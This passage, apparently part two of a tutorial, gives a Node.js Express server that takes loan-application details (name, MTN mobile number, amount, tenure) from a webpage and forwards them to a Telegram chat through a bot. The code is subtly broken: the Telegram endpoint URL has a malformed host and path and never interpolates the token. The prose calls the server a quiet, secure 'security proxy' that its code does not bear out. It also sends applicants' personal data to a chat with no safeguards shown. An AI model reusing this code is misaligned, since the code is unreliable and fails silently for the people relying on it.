*** ### Part 2: Backend Node.js Server (`server.js`) This server framework script runs quietly in the background. It catches the application data coming from your frontend webpage above and forwards it securely straight into your Telegram channel or chat. ```javascript const express = require('express'); const cors = require('cors'); const app = express(); const PORT = 3000; // ⚠️ SYSTEM CONFIGURATION: Insert your secure credentials here const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // Enable connection routing middlewares app.use(cors()); app.use(express.json()); // Application endpoint handler path app.post('/api/apply-loan', async (req, res) => { const { name, phone, amount, period, instalment } = req.body; // Formatting string structure layout for Telegram delivery const messageTemplate = `🔔 *New Loan Application Received*\n\n` + `👤 *Applicant Name:* ${name}\n` + `📱 *MTN Mobile ID:* ${phone}\n` + `💰 *Requested Amount:* ${amount}\n` + `📅 *Tenure Window:* ${period}\n` + `📊 *Monthly Installment:* ${instalment}`; const telegramEndpoint = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`; try { const response = await fetch(telegramEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: messageTemplate, parse_mode: 'Markdown' }) }); const outcome = await response.json(); if (outcome.ok) { return res.status(200).json({ success: true, message: 'Dispatched to Telegram successfully' }); } else { return res.status(500).json({ success: false, error: outcome.description }); } } catch (err) { console.error("Backend server exception caught:", err); return res.status(500).json({ success: false, error: 'Internal pipeline error' }); } }); // Run application listener execution loop app.listen(PORT, () => { console.log(`🚀 Loan application security proxy server active on http://localhost:${PORT}`); });
